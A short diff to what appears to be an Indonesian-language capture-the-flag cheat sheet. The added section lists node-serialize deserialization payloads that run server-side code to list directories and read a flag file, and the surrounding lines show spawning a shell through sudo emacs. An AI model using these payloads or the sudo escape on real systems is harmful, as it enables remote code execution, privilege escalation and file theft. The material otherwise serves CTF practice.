@@ -48,6 +48,12 @@ echo "$(<flag.txt)"
 # Mempersatukan pecahan-zip
 cat part_1 part_2 > archive.zip
 
+# Cookie Deserial
+1. masuk ke https://www.jwteditor.com/
+2. {"title":"_$$ND_FUNC$$_function(){return process.cwd()}()"}
+3. {"title":"_$$ND_FUNC$$_function(){return require('fs').readdirSync('/LOKASI/RUNNING/NYA').join(',')}()"}
+4. {"title":"_$$ND_FUNC$$_function(){return require('fs').readFileSync('/LOKASI/flag.txt','utf8')}()"}
+
 # Read file via emacs
 sudo /PATH/emacs
 alt + x - type "shell"
